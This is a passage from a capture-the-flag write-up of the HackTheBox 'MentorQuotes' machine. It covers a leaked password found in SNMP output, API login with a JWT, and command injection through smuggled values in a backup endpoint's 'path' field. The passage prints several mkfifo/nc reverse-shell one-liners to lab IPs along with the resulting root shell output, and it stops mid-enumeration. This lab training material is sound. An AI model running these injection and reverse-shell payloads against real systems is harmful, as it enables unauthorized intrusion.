HOST-RESOURCES-MIB::hrSWRunParameters.1262<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-o -p -- \\u --noclear tty1 linux&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1277<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-k start&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1278<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-k start&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1279<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-k start&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1341<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-H fd:// --containerd=/run/containerd/containerd.sock&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1690<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;/usr/local/bin/login.sh&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1755<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.4 -container-port 5432&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1771<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-namespace moby -id 96e44c5692920491cdb954f3d352b3532a88425979cd48b3959b63bfec98a6f4 -address /run/containerd/containerd.sock&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1863<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1877<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-namespace moby -id 03cde9245f87bb8dee1ad649db30a6789d0ad8264d9be26328ccbc777608f19f -address /run/containerd/containerd.sock&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1898<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-m uvicorn app.main:app --reload --workers 2 --host 0.0.0.0 --port 8000&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.1983<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.2 -container-port 80&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.2002<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-namespace moby -id 8ec56cb27181c04f61e25615aad76f3aab86d1ed088832119c8861d8f6e75164 -address /run/containerd/containerd.sock&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.2022<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;main.py&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.2051<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-c from multiprocessing.semaphore_tracker import main;main(4)&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.2052<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.2119<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;/usr/local/bin/login.py kj23sadkj123as0-d213&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.22614<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-c tar -c -f /etc/passwd;rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.9 4242 &gt; f;/app_backkup.tar /app/ &amp;&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.22618<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;f&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.22619<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;-i&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.22620<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;10.10.16.9 4242&quot;</span>
HOST-RESOURCES-MIB::hrSWRunParameters.22931<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;models.py&quot;</span>
</pre></div>
</div>
</section>
<section id="command-injection-in-the-api">
<h2>Command injection in the API<a class="headerlink" href="#command-injection-in-the-api" title="Permalink to this heading">#</a></h2>
<p>This password doesn’t work either with usernames james or admin as ssh password, but if we come back to our api, we can now login as james with that password.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-sX<span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="s1">&#39;http://api.mentorquotes.htb/auth/login&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;accept: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{</span>
<span class="s1">  &quot;email&quot;: &quot;james@mentorquotes.htb&quot;,</span>
<span class="s1">  &quot;username&quot;: &quot;james&quot;,</span>
<span class="s1">  &quot;password&quot;: &quot;kj23sadkj123as0-d213&quot;</span>
<span class="s1">}&#39;</span><span class="w"> </span><span class="p">|</span><span class="se">\</span>
jq<span class="w"> </span><span class="s2">&quot;.&quot;</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="s2">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&quot;</span>
</pre></div>
</div>
<p>So we now have admin privileges on the api</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-sX<span class="w"> </span><span class="s1">&#39;GET&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="s1">&#39;http://api.mentorquotes.htb/users/&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;accept: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="p">|</span><span class="se">\</span>
jq<span class="w"> </span><span class="s2">&quot;.&quot;</span>
</pre></div>
</div>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">[</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;email&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;james@mentorquotes.htb&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;james&quot;</span>
<span class="w">  </span><span class="p">},</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;email&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;svc@mentorquotes.htb&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;service_acc&quot;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">]</span>
</pre></div>
</div>
<p>And we can leverage that with the <code class="docutils literal notranslate"><span class="pre">undocumented</span></code> endpoint <code class="docutils literal notranslate"><span class="pre">backup</span></code>, we have found that earlyer with our dirsearch scan. After a little trial and error it’s easy to figure out that the enpoint only accepts the POST method and it tells us the <code class="docutils literal notranslate"><span class="pre">loc</span></code> parameter is missing, so we add it, now it says <code class="docutils literal notranslate"><span class="pre">path</span></code> is missing, so again we add it, and finally get a successfull response.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-sX<span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="s1">&#39;http://api.mentorquotes.htb/admin/backup&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;accept: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;loc&quot;: &quot;x&quot;, &quot;path&quot;: &quot;xx&quot;}&#39;</span><span class="p">|</span>jq<span class="w"> </span>.
</pre></div>
</div>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;INFO&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Done!&quot;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>So it sounds like it could be doing someting like that in the backend</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>tar<span class="w"> </span>-cvzf<span class="w"> </span>&lt;path&gt;.tar.gz<span class="w"> </span>&lt;loc&gt;
</pre></div>
</div>
<p>Can we do some command injection?</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>tar<span class="w"> </span>-cvzf<span class="w"> </span>x<span class="p">;</span>sleep<span class="w"> </span><span class="m">1</span><span class="p">;</span>.tar.gz<span class="w"> </span>xx
</pre></div>
</div>
<p>Yep this works, and returns after 1 sec</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-sX<span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="s1">&#39;http://api.mentorquotes.htb/admin/backup&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;accept: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;loc&quot;: &quot;x;sleep 1;&quot;, &quot;path&quot;: &quot;xx;sleep 1;&quot;}&#39;</span><span class="p">|</span>jq<span class="w"> </span>.
</pre></div>
</div>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;INFO&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Done!&quot;</span>
<span class="p">}</span>
</pre></div>
</div>
</section>
<section id="the-tcpdump-tangent">
<h2>The TCPDump tangent<a class="headerlink" href="#the-tcpdump-tangent" title="Permalink to this heading">#</a></h2>
<p>Since we’re shamelessly following ipssec’s video at this stage, i’m also trying the tcpdump listerner to catch ICMP packets, taking notes as this isn’t the first time I see this, and I think it’s pretty cool.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-sX<span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="s1">&#39;http://api.mentorquotes.htb/admin/backup&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;accept: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;loc&quot;: &quot;x&quot;, &quot;path&quot;: &quot;xx;ping -c2 10.10.14.130;&quot;}&#39;</span><span class="p">|</span>jq<span class="w"> </span>.
</pre></div>
</div>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;INFO&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Done!&quot;</span>
<span class="p">}</span>
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-i<span class="w"> </span>tun0<span class="w"> </span>-v<span class="w"> </span>icmp
tcpdump:<span class="w"> </span>listening<span class="w"> </span>on<span class="w"> </span>tun0,<span class="w"> </span>link-type<span class="w"> </span>RAW<span class="w"> </span><span class="o">(</span>Raw<span class="w"> </span>IP<span class="o">)</span>,<span class="w"> </span>snapshot<span class="w"> </span>length<span class="w"> </span><span class="m">262144</span><span class="w"> </span>bytes
<span class="m">18</span>:42:59.673088<span class="w"> </span>IP<span class="w"> </span><span class="o">(</span>tos<span class="w"> </span>0x0,<span class="w"> </span>ttl<span class="w"> </span><span class="m">62</span>,<span class="w"> </span>id<span class="w"> </span><span class="m">38684</span>,<span class="w"> </span>offset<span class="w"> </span><span class="m">0</span>,<span class="w"> </span>flags<span class="w"> </span><span class="o">[</span>DF<span class="o">]</span>,<span class="w"> </span>proto<span class="w"> </span>ICMP<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="o">)</span>,<span class="w"> </span>length<span class="w"> </span><span class="m">84</span><span class="o">)</span>
<span class="w">    </span>mentorquotes.htb<span class="w"> </span>&gt;<span class="w"> </span><span class="m">10</span>.10.14.130:<span class="w"> </span>ICMP<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>request,<span class="w"> </span>id<span class="w"> </span><span class="m">4096</span>,<span class="w"> </span>seq<span class="w"> </span><span class="m">0</span>,<span class="w"> </span>length<span class="w"> </span><span class="m">64</span>
<span class="m">18</span>:42:59.673178<span class="w"> </span>IP<span class="w"> </span><span class="o">(</span>tos<span class="w"> </span>0x0,<span class="w"> </span>ttl<span class="w"> </span><span class="m">64</span>,<span class="w"> </span>id<span class="w"> </span><span class="m">26189</span>,<span class="w"> </span>offset<span class="w"> </span><span class="m">0</span>,<span class="w"> </span>flags<span class="w"> </span><span class="o">[</span>none<span class="o">]</span>,<span class="w"> </span>proto<span class="w"> </span>ICMP<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="o">)</span>,<span class="w"> </span>length<span class="w"> </span><span class="m">84</span><span class="o">)</span>
<span class="w">    </span><span class="m">10</span>.10.14.130<span class="w"> </span>&gt;<span class="w"> </span>mentorquotes.htb:<span class="w"> </span>ICMP<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>reply,<span class="w"> </span>id<span class="w"> </span><span class="m">4096</span>,<span class="w"> </span>seq<span class="w"> </span><span class="m">0</span>,<span class="w"> </span>length<span class="w"> </span><span class="m">64</span>
</pre></div>
</div>
</section>
<section id="foothold">
<h2>Foothold<a class="headerlink" href="#foothold" title="Permalink to this heading">#</a></h2>
<p>So we have command execution, we can just do a revshell now, tried a few with bash, didn’t work.
We’ll realize later that’s because we’re in an Alpine container and as a result we only have sh.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-sX<span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="s1">&#39;http://api.mentorquotes.htb/admin/backup&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;accept: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;loc&quot;: &quot;x;sleep 1;&quot;, &quot;path&quot;: &quot;xx;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.130 4242 &gt;/tmp/f;&quot;}&#39;</span><span class="p">|</span>jq<span class="w"> </span>.
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">rlwrap</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">4242</span>
<span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="nb">any</span><span class="p">]</span> <span class="mi">4242</span> <span class="o">...</span>
<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10.14.130</span><span class="p">]</span> <span class="kn">from</span><span class="w"> </span><span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10.11.193</span><span class="p">]</span> <span class="mi">37345</span>
<span class="n">sh</span><span class="p">:</span> <span class="n">can</span><span class="s1">&#39;t access tty; job control turned off</span>
<span class="o">/</span><span class="n">app</span> <span class="c1"># pwd</span>
<span class="o">/</span><span class="n">app</span>
<span class="o">/</span><span class="n">app</span> <span class="c1"># id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">),</span><span class="mi">1</span><span class="p">(</span><span class="nb">bin</span><span class="p">),</span><span class="mi">2</span><span class="p">(</span><span class="n">daemon</span><span class="p">),</span><span class="mi">3</span><span class="p">(</span><span class="n">sys</span><span class="p">),</span><span class="mi">4</span><span class="p">(</span><span class="n">adm</span><span class="p">),</span><span class="mi">6</span><span class="p">(</span><span class="n">disk</span><span class="p">),</span><span class="mi">10</span><span class="p">(</span><span class="n">wheel</span><span class="p">),</span><span class="mi">11</span><span class="p">(</span><span class="n">floppy</span><span class="p">),</span><span class="mi">20</span><span class="p">(</span><span class="n">dialout</span><span class="p">),</span><span class="mi">26</span><span class="p">(</span><span class="n">tape</span><span class="p">),</span><span class="mi">27</span><span class="p">(</span><span class="n">video</span><span class="p">)</span>
<span class="o">/</span><span class="n">app</span> <span class="c1"># ls -la</span>
<span class="n">total</span> <span class="mi">24</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">10</span> <span class="mi">16</span><span class="p">:</span><span class="mi">00</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">11</span> <span class="mi">18</span><span class="p">:</span><span class="mi">51</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">1024</span> <span class="n">Jun</span> <span class="mi">12</span>  <span class="mi">2022</span> <span class="o">.</span><span class="n">Dockerfile</span><span class="o">.</span><span class="n">swp</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>           <span class="mi">522</span> <span class="n">Nov</span>  <span class="mi">3</span> <span class="mi">12</span><span class="p">:</span><span class="mi">58</span> <span class="n">Dockerfile</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">10</span> <span class="mi">16</span><span class="p">:</span><span class="mi">00</span> <span class="n">app</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>           <span class="mi">672</span> <span class="n">Jun</span>  <span class="mi">4</span>  <span class="mi">2022</span> <span class="n">requirements</span><span class="o">.</span><span class="n">txt</span>
<span class="o">/</span><span class="n">app</span> <span class="c1"># cd</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">svc</span> <span class="c1"># ls -la</span>
<span class="n">total</span> <span class="mi">28</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span>    <span class="mi">4</span> <span class="mi">1001</span>     <span class="mi">1001</span>          <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">11</span> <span class="mi">17</span><span class="p">:</span><span class="mi">41</span> <span class="o">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>          <span class="mi">4096</span> <span class="n">Nov</span> <span class="mi">10</span> <span class="mi">16</span><span class="p">:</span><span class="mi">00</span> <span class="o">..</span>
<span class="n">lrwxrwxrwx</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>             <span class="mi">9</span> <span class="n">Nov</span> <span class="mi">10</span> <span class="mi">14</span><span class="p">:</span><span class="mi">28</span> <span class="o">.</span><span class="n">bash_history</span> <span class="o">-&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>    <span class="mi">1</span> <span class="mi">1001</span>     <span class="mi">1001</span>          <span class="mi">3771</span> <span class="n">Jun</span>  <span class="mi">7</span>  <span class="mi">2022</span> <span class="o">.</span><span class="n">bashrc</span>
<span class="n">drwx</span><span class="o">------</span>    <span class="mi">3</span> <span class="mi">1001</span>     <span class="mi">1001</span>          <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">12</span>  <span class="mi">2022</span> <span class="o">.</span><span class="n">cache</span>
<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span>    <span class="mi">5</span> <span class="mi">1001</span>     <span class="mi">1001</span>          <span class="mi">4096</span> <span class="n">Jun</span> <span class="mi">12</span>  <span class="mi">2022</span> <span class="o">.</span><span class="n">local</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>    <span class="mi">1</span> <span class="mi">1001</span>     <span class="mi">1001</span>           <span class="mi">807</span> <span class="n">Jun</span>  <span class="mi">7</span>  <span class="mi">2022</span> <span class="o">.</span><span class="n">profile</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">-----</span>    <span class="mi">1</span> <span class="n">root</span>     <span class="mi">1001</span>            <span class="mi">33</span> <span class="n">Mar</span> <span class="mi">11</span> <span class="mi">18</span><span class="p">:</span><span class="mi">51</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">svc</span> <span class="c1"># cat /etc/*release</span>
<span class="mf">3.10.3</span>
<span class="n">NAME</span><span class="o">=</span><span class="s2">&quot;Alpine Linux&quot;</span>
<span class="n">ID</span><span class="o">=</span><span class="n">alpine</span>
<span class="n">VERSION_ID</span><span class="o">=</span><span class="mf">3.10.3</span>
<span class="n">PRETTY_NAME</span><span class="o">=</span><span class="s2">&quot;Alpine Linux v3.10&quot;</span>
<span class="n">HOME_URL</span><span class="o">=</span><span class="s2">&quot;https://alpinelinux.org/&quot;</span>
<span class="n">BUG_REPORT_URL</span><span class="o">=</span><span class="s2">&quot;https://bugs.alpinelinux.org/&quot;</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">svc</span> <span class="c1">#</span>
</pre></div>
</div>
<p>Improved exploit with nohup and backgrounding the process and finally escaping the rest of the command with a comment, because we can’t do ; and &amp; at the same time.<br />
All those tricks come from the ippsec video</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-sX<span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span><span class="s1">&#39;http://api.mentorquotes.htb/admin/backup&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;accept: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;loc&quot;: &quot;x&quot;, &quot;path&quot;: &quot;xx;nohup rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.130 4242 &gt;/tmp/f &amp;#&quot;}&#39;</span><span class="p">|</span>jq<span class="w"> </span>.
</pre></div>
</div>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;INFO&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Done!&quot;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>from nohup’s man page, so now it won’t crash the box every single time anymore:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nohup</span> <span class="o">-</span> <span class="n">run</span> <span class="n">a</span> <span class="n">command</span> <span class="n">immune</span> <span class="n">to</span> <span class="n">hangups</span><span class="p">,</span> <span class="k">with</span> <span class="n">output</span> <span class="n">to</span> <span class="n">a</span> <span class="n">non</span><span class="o">-</span><span class="n">tty</span>
</pre></div>
</div>
</section>
<section id="pivoting-and-further-enumeration">
<h2>Pivoting and further enumeration<a class="headerlink" href="#pivoting-and-further-enumeration" title="Permalink to this heading">#</a></h2>
<p>Looking around we can see that there’s a postgres instance on the host:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>/app/app<span class="w"> </span><span class="c1"># head db.py</span>
import<span class="w"> </span>os

from<span class="w"> </span>sqlalchemy<span class="w"> </span>import<span class="w"> </span><span class="o">(</span>Column,<span class="w"> </span>DateTime,<span class="w"> </span>Integer,<span class="w"> </span>String,<span class="w"> </span>Table,<span class="w"> </span>create_engine,<span class="w"> </span>MetaData<span class="o">)</span>
